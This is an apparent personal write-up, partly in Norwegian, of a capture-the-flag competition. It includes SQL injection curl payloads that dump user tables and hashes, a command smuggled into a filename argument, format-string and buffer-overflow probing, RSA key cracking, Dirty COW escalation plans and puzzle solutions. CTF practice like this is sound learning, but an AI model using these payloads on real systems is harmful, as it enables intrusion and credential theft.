# Etj CTF

## 1.1

cat FLAGG

## 1.2

./cat FLAGG

## 1.3

./md5sum "FLAGG; cat FLAGG"

## 1.4

./overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGHAAAAAAAAAAAAAAAAAAAAAAA0000000

## 1.5

./check_password Reverse_engineering_er_morsomt__

## 2.0

nmap ....
10.0.47.81
10.0.47.82
10.0.47.83 scoreboard     80/tcp open  http
10.0.47.84
10.0.47.85
10.0.47.87 keystore       80/tcp open  http
10.0.47.88 cloud-hq       22/tcp open  ssh (key only)
10.0.47.89
10.0.47.90
10.0.47.93 cloud-c2-70    1337/tcp open  waste

## 2.1_keystore

SQL injection

the URL provided use the input for constructing an sql query. there is no sanitation beforehand, so we can ' and use union to insert 3 columns of our own. We can get tablenames from information_schema.tables e.g: "UNION+SELECT+TABLE_NAME,+NULL,+NULL+FROM+information_schema.tables", and run again to get column names for the interesting tables (keystore, userstore, user_key_upload) from information_schema.columns. Then we need to fetch id unmber from keystore, look up this in user_key_upload to find user_id. Then look up this user_id in userstore to find the username.

`curl "http://keystore/query.php?keyname=%27+UNION+SELECT+@@version,NULL,NULL%23"`
returns version= 8.0.19 which indicate MySql

`curl "http://keystore/query.php?keyname=%27+UNION+SELECT+TABLE_NAME,+NULL,+NULL+FROM+information_schema.tables%23" | tail`

Return tablenames: keystore, user_key_upload, userstore

`curl "http://keystore/query.php?keyname=%27+UNION+SELECT++table_name,COLUMN_NAME,+NULL+FROM+information_schema.columns%23" | tail -n 10`

return the tablenames and columns:
keystore:
  key_id
  key_type
  key_data
  owner
user_key_upload:
  user_id
  key_id
  upload_date
userstore:
  user_id
  user_name
  user_password

`curl "http://keystore/query.php?keyname=%27+UNION+SELECT+k.key_id,k.key_type,k.owner+FROM+keystore+k%23"`

returns:
13941 ssh-rsa vault@laptop-mgr-46
14074 ssh-rsa vault@laptop-mgr-21
14347 ssh-rsa lootd@cloud-mgr-46
15572 ssh-rsa lootd@cloud-mgr-26
15887 ssh-rsa vault@cloud-c2-54
16006 ssh-ed25519 nadiah@localhost
16048 ssh-rsa vault@cloud-c2-64
16986 ssh-rsa vault@laptop-cache-51
17245 ssh-rsa oper@cloud-hq-42
17462 ssh-rsa lootd@laptop-cache-84
17693 ssh-rsa oper@cloud-mgr-15
18008 ssh-rsa lootd@vps-c2-40
18358 ssh-rsa vault@laptop-mgr-58
18407 ssh-rsa vault@cloud-c2-70
18421 ssh-ed25519 arjen.lenstra@localhost
18435 ssh-rsa oper@laptop-mgr-79
18617 ssh-rsa vault@laptop-c2-86
18813 ssh-rsa oper@laptop-c2-25
18876 ssh-rsa oper@cloud-c2-57
19044 ssh-rsa vault@laptop-cache-1
19408 ssh-rsa vault@cloud-cache-73

This looks like all the uploaded public keys, we are interested in oper@cloud-mgr-15, so we use the associated key_id (17693) to look further:

`curl "http://keystore/query.php?keyname=%27+UNION+SELECT+user_id,key_id,upload_date+FROM+user_key_upload+WHERE+key_id%3D+17693+%23"`

returns:
user  key data
20524 17693 1083438277

now we know which user we want to look up:

`curl "http://keystore/query.php?keyname=%27+UNION+SELECT+user_id,user_name,user_password+FROM+userstore+WHERE+user_id+%3D+20524%23"`

returns:
20524 Elliot Alderson 014aedf1bc63277183ae5034c023c8ba

the name "Elliot Alderson" is the flag for 2.1

Oppgave:  2.1_keystore
Svar:     Elliot Alderson
"Vi har indikasjoner på at aktørens kryptonøkkel-generator har en bakdør. Kan du undersøke videre?"

Siden det er snakk om problematisk kryptonøkkel-generering, og jeg husker at det lå en haug av public-keys på keystore, så laster jeg ned alle disse. Kan hente alle på en gang med:

`curl "http://keystore/query.php?keyname=%27+OR+1+%3D+1%23"`

Lagrer alle disse i hver sin fil med filname som 'vault@cloud-cache-73.pub'.

Deretter bruker jeg [RsaCtfTool](https://github.com/Ganapati/RsaCtfTool) for å teste om nøklene har svakheter:

`./RsaCtfTool.py --publickey  "./nøkler/*.pub" --private --verbose`

Dette lister en haug av private keys. Det viser seg at det er "common factor modulus" svakhet, altså det er brukt samme primtall ved genereringen av nøkler (for alle utenom oper@cloud-hq-42.pub). Jeg merker meg at jeg fant cloud-hq med åpen ssh-port når jeg kjøre nmap. Kanskje kan denne nøkkelen knekkes senere så jeg får login på hq?

## 2.2_lootd

We get hostname and port, and using netcat we meet ./lootd endpoint. 'help' or '?' prints: "./lootd: available commands: help, upload, download, uname, uptime". uname prints 'Linux bovinae 4.8.0+ #1 SMP Thu Oct 13 20:07:36 UTC 2016 x86_64 Linux'. Peculiar. HISTORY.md mentioned dirty c0w, and 'bovinae' sounds cow-ish. The Linux kernel 4.8.0 is susceptible to dirty c0w. Maybe if we get shell access to the computer hosting ./lootd?

download let us download ./lootd to inspect the binary.
when inspecting binary locally, it uses gets() (overflow vuln.?) and printf() (format string vuln.?)
upload may let us upload file of given size? when trying this locally, it reference missing /usr/sbin/moveloot (a movemail reference?)
uptime use syscall to get uptime, seems to execute the uptime binary. possible to exploit?

bruker /lib/ld-musl-x86_64.so.1
    og "musl does not support glibc’s custom format specifier registration system." så det blir litt mer tungvint å bruke format strings

I try to leak more information about memory addresses by utilizing format string %p.

første verdi på stacken er addr til printf@plt (eller puts?)
verdien ved denne adressen kan endres til system()?

prerun:
0x1040 <printf@plt>: 0x2fe225ff
0x1090 <puts@plt>: 0x2fba25ff

runtime:
0x000055a063098040  printf@plt
0x000055a063098090  puts@plt
0x7fd4112dfeb0 <printf: 0xd8ec8148
0x7fd4112e0240 <puts: 0x89485355
0x7fd4112d0b10 <system: 0x12b95741  (random offset?)
  121cf system
  a4750 /bin/sh system + 0x92581
  a9422 /bin/sh system + 0x97273

ghidra  printf@plt is at 0x101040
        puts@plt is at 0x101090

ghidra uptime 0x0010175b => base: 0x0175b
 (%p - (0x10a7 + 0x1040) + 0x0175b) should be get_uptime

stack at runtime @input:
0x55a0630990e7 - 0x10a7 after printf@plt (points to ghidra 0x1020e7 er_help)
0xffffffff ,  0 ,  0 , 0x1b , 0x7ffc8c79e6e0
0x55a063098af6 - 0xab6 after print@plt (points to ghidra 0x101af6 rip for kall til unknown_cmd)
after this comes the input
0x55a063098b7d - 0xb3d etter print@plt (0x101b7d ghidra - rip call get_commands) return ved: base + 1b0e

%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p %p AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS siste resultat,z gir en verdi som er 0x2efa5 foran system
            og 0x8a8b7 mindre enn /bin/sh

%p%p%p%p%p %p siste resultat peker til stack-adressen?

/bin/bash -p;   AAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGHHHHHHHHHHHHH[çÈ9U
0x5634ae44f75b => 5bf744ae3456

%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p  %p

aaaaaaaaaaAAAAAAAAAAbbbbbbbbbbBBBBBBBBBBccccccccccCCCCCCCCCCddddddddddDDDDDDDDDDeeeeeeeeeeEEEEEEEEEEffffffffffFFFFFFFFFFggggggggggGGGGHH

first position in stack is 0x000055b55251b040
0xc0e7 - 0xb040 = 4263 etter pekeren til printf
0xc0e7 - 0xb090 = 4183 etter pekeren til puts

kan kjøre en enkelt %p på remote, trekke fra verdien 4183, så har jeg adressen til puts@plt for remote app

finner env:
PWD=/home/lootd
USERHASH=c2885919f5ff39fc813b091f199f0a37
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
bruker SOCAT=1.7.3.3 <- ikke kjent vulnerability>
HOME=/root

musl-libc har gadget: "pop rdi; ret" @ 0x15276

cat FLAG

## 2.3_loot_home

cat ../FLAG

## 2.4_loot_vault

Some information gathering:

From /home/vault/.ash_history:
            ```curl -o /tmp/xxx http://keystore/query.php?keyname=oper@cloud-mgr-72
            cat /tmp/xxx
            rm -rf /tmp/xx
            exit
            find /vault/loot -type f
            find /vault/loot -type f | wc -l
            du -ms /vault/loot
            curl http://keystore/query.php?keyname=oper@cloud-hq-42
            vi id
            tar cz /vault/loot | ssh -i id oper@cloud-hq-42 lootimport
            rm id
            exit```

interesting stuff owned by vault user:
    /tmp/xxx
    /vault/loot

strings from moveloot:
          /vault/loot/seq.
          /vault/loot/key

also /home/oper/bin/crypt0r
all these can be read if gid=100

Enter [dirtyc0w vulnerability](https://dirtycow.ninja)

What else can we use by writing to files?

suid files:
/bin
    mount   <-- root
    umount  <-- root
/usr/sbin
    moveloot <- loot

moveloot har også SGID og gid=100

write shellcode with setuid=1001 (og gid=100) into moveloot via dirtyc0w?
[linux syscall codes](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)

## 2.5_headquarters

fikk key fra /tmp/bak, denne har samme primtall som oper@cloud-hq-42 (som jeg håpet).. dermed har jeg private key til hq.
bruker dette til å shh inn: ssh oper@cloud-hq-42 -i keys/oper@cloud-hq-42
cat FLAG

## 2.6_decryption

key: 81f75f6eda0a961eba3b4e6ce7400510

files:
  seq.0000.zavzlqdyoakhcdqzacqdiamtytleoljooepzwuzlwluyokxppnsxpgqobbuppdfd
  seq.0000.zeicfgrnvksuptofqkcopbgbbppogemfiujncbdynvsdqgigqnwhqcktubicfuhn
  seq.0001.zeicfgrnvksuptofqkcopbgbbppogemfiujncbdynvsdqgigqnwhqcktubicfuhn

tar cz /vault/loot | ssh -i id oper@cloud-hq-42 lootimport

cat lootimport
    #!/bin/sh
    set -ex
    d=$(mktemp -d)
    tar xz -C $d
    #find $d -type f | xargs -n1 cat | crypt0r "precise stallion cell nail" | less

cat loot/seq.0000.zavzlqdyoakhcdqzacqdiamtytleoljooepzwuzlwluyokxppnsxpgqobbuppdfd | ./crypt0r "precise stallion cell nail"

## 3.1.1_clmystery

Rote rundt med forskjellige kommandolinjeverktøy

## 3.1.2_knock-knock

merker at bankingen til figuren er rytmisk, så noterer intervaller. alle er mellom 1 og 5, og ser ut til å henge sammen to og to. På slutten av filmen kommer noe som ser ut til å være formel for matrise og transponert matrise. Hint om å bruke alfabetmatrise, med bankeintervallene som koordinater? og eventuelt transponere matrisene (eller bytte til kolonneindeksering). Prøver tradisjonell alfabetmatrise:

a b c d e
f g h i/j k
l m n o p
q r s t u
v w x y z

3,4: 4,2: 1,4: 1,5: 4,4:
O    R    D    E    T
1,4: 4,5:
D    U
3,1: 1,5: 4,4: 1,5: 4,2:
L    E    T    E    R
1,5: 4,4: 4,4: 1,5: 4,2:
E    T     T   E    R
1,5: 4,2:
E    R
4,4: 1,1: 3,5: 1,4: 1,1: 3,3: 1,3: 1,5:
T    A    P    D    A    N    C    E

## 3.1.3_runer

translate to latin letter, switch order of columns. the big hint is the five letters on the first line almost makes out FUTHA, which is similar to futhark. chang the order of columns and read out row by row.

## 3.1.4_sharing_secrets_k=2, k=3, k=4: LØST k=9 avhenger av løsninger på andre oppgaver

bruker pythonskript fra wikipedia for å løse shamir, og putter inn hintene fra scoreboard --secret-shares

## 3.2.1_artwork_del_1

løses ved å gjøre bildet (piet-kode) om til kjørbar. ved kjøring får man beskjed om å hashe en streng med HAVAL()
<https://quickhash.com> velg haval 128,3
haval(mondrian) => 153ceff44d69be87e33b1439c14899e8

## 3.2.1_artwork_del_2

My approach was to use repiet to convert the piet-image to python code, and then use python debugger pdb and look at the source.

I soon found some patterns in the code. At the start ta program pushes a lot of numbers to the "stack" and then do some operations on these. Often thre numbers will be added, then the last two multiplied together, and then the first is added. The result, i turns out, is ascii values. The program goes through all the text in reverse, then loops back and print each constructed ascii character. I used the following code in pdb to read out text from the stack:
> [chr(a&255) for a in stack[::-1]]

Afterwards I looked over other parts of the code for the same patterns, (push 3 numbers, multiply and add). Sure enough, starting from the python function "x250y0" we can decode: Tr0ub4d0r$3, stable, battery, horse, correct. Remember the HISTORIE.md? XKCD ref. Apparently the password is Tr0ub4d0r&3, which will print out: "correct horse battery staple", which also is the flag.

## 3.2.explosion

e(0) = 1
e(1) = 4
e(2) = 11
e(3) = 72

main+438 (first time?)
  e(1) rbx = 2
  e(2) rbx = 3
  e(3) rbx = 4

  etter loop (antall avhenger av input):
    modulus(x, 0x613b62c597707ef)

  i = 0
  do {
        Em(local_78,uVar4);     allokere minne?
        Em(local_58,uVar4);     allokere minne?
        fun(SUB81(local_98,0),SUB81(local_58,0));
        Add(local_248,local_98);
        ~asdf(local_98);        deallokere?
        ~asdf(local_58);        deallokere?
        ~asdf(local_78);        deallokere?
        i += 1;
  } while (i <= input);
  Modulus(local_248,0x613b62c597707ef);   modulus 0x613b62c597707ef

  x mod 437893890380859375 = resultat?
